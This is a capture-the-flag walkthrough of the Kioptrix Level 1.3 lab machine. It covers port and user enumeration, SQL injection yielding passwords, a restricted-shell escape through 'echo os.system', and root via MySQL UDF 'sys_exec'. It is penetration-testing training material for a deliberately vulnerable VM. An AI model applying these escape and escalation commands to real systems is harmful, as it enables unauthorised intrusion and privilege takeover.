#  Kioptrix: Level 1.3 (#4)

## Recon & Enummeration

Nmap shows us SSH, Apache and Samba
```
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey: 
|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)
|_  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.28a (workgroup: WORKGROUP)
```
 
Gobuster shows us two possible usernames:
```
2021/02/23 18:47:29 Starting gobuster
===============================================================
/index (Status: 200)
/images (Status: 301)
/member (Status: 302)
/logout (Status: 302)
/john (Status: 301)
/robert (Status: 301)
/server-status (Status: 403)
```

enum4linux shows that anonymous SMB login is disabled.


nmap's smb-enum-users script shows more users:
```
Host script results:
| smb-enum-users: 
|   KIOPTRIX4\john (RID: 3002)
|     Full name:   ,,,
|     Flags:       Normal user account
|   KIOPTRIX4\loneferret (RID: 3000)
|     Full name:   loneferret,,,
|     Flags:       Normal user account
|   KIOPTRIX4\nobody (RID: 501)
|     Full name:   nobody
|     Flags:       Normal user account
|   KIOPTRIX4\robert (RID: 3004)
|     Full name:   ,,,
|     Flags:       Normal user account
|   KIOPTRIX4\root (RID: 1000)
|     Full name:   root
|_    Flags:       Normal user account
```

## Intitial Foothold

### SQL injection
We can find two passwords when SQL injecting the users robert and john.
```
john:MyNameIsJohn
robert:ADGAdsafdfwt4gadfga==
```

User loneferret is not available within the webapplication, and is likely to be a normal account

### LigGoat shell

When we SSH into the box with the credentials, we notice directly we are not in an ordinary bash shell:
```
== Welcome LigGoat Employee ==
LigGoat Shell is in place so you  don't screw up
Type '?' or 'help' to get the list of allowed commands
robert:~$ ?
cd  clear  echo  exit  help  ll  lpath  ls
```

This shell offers us minimal capabilities.
The shell we are in is an lshell. Which is python based.
We have access to "echo" so we can escape the shell by:
```
echo os.system('/bin/bash')
```

## Privilege Escalation

### MySQL UDF Exploitation

As Mysql is run as root, and the sys_exec binary is available

```
john@Kioptrix4:/root$ mysql -u root -p                     
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 1
Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

mysql> select sys_exec("usermod -add -G admin john");
mysql> quit;
Bye
john@Kioptrix4:/root$ sudo su
root@Kioptrix4:/root# 
```




